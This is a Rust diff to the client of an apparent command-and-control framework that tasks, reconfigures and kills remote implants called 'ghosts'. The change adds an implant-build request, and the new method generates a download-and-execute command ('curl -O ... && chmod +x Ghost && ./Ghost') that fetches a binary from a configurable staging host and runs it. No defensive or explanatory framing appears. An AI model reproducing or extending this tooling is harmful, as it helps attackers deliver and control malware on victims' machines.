@@ -1,4 +1,4 @@
-use crate::models::{Ghost, GhostConfigUpdate, Task, TaskRequest};
+use crate::models::{Ghost, GhostConfigUpdate, Task, TaskRequest, GhostBuildRequest};
 use async_trait::async_trait;
 use reqwest::Client;
 use std::env;
@@ -11,6 +11,7 @@ pub trait C2Client: Send + Sync {
     async fn send_task(&self, ghost_id: &str, req: TaskRequest) -> Result<String, String>;
     async fn update_config(&self, ghost_id: &str, config: GhostConfigUpdate) -> Result<String, String>;
     async fn kill_ghost(&self, ghost_id: &str) -> Result<String, String>;
+    async fn request_build(&self, req: GhostBuildRequest) -> Result<String, String>;
 }
 
 pub struct RealClient {
@@ -43,7 +44,7 @@ impl RealClient {
         let base_url = base_url.trim_end_matches('/').to_string(); 
 
         let http = Client::builder()
-            .timeout(Duration::from_secs(5))
+            .timeout(Duration::from_secs(30))
             .build()
             .unwrap_or_default();
 
@@ -122,6 +123,33 @@ impl C2Client for RealClient {
             Ok("Kill signal sent".to_string())
         } else {
             Err(format!("Server returned error: {}", res.status()))
+        }
+    }
+
+    async fn request_build(&self, req: GhostBuildRequest) -> Result<String, String> {
+        let url = format!("{}/build", self.base_url);
+
+        let res = self.http
+            .post(&url)
+            .json(&req)
+            .send()
+            .await
+            .map_err(|e| format!("Build request failed: {}", e))?;
+
+        if res.status().is_success() {
+            let download_path = res.json::<String>().await.map_err(|e| format!("Failed to parse build response: {}", e))?;
+
+            let shadow_url = env::var("SHADOW_URL").unwrap_or_else(|_| "127.0.0.1".to_string());
+            let shadow_port = env::var("SHADOW_PORT").unwrap_or_else(|_| "9999".to_string());
+
+            let full_url = format!("http://{}:{}{}", shadow_url, shadow_port, download_path);
+            let command = format!("curl -O {} && chmod +x Ghost && ./Ghost", full_url);
+
+            Ok(command)
+        } else {
+            let status = res.status();
+            let error_message = res.text().await.unwrap_or_default();
+            Err(format!("Server returned error {}: {}", status, error_message))
         }
     }
 }
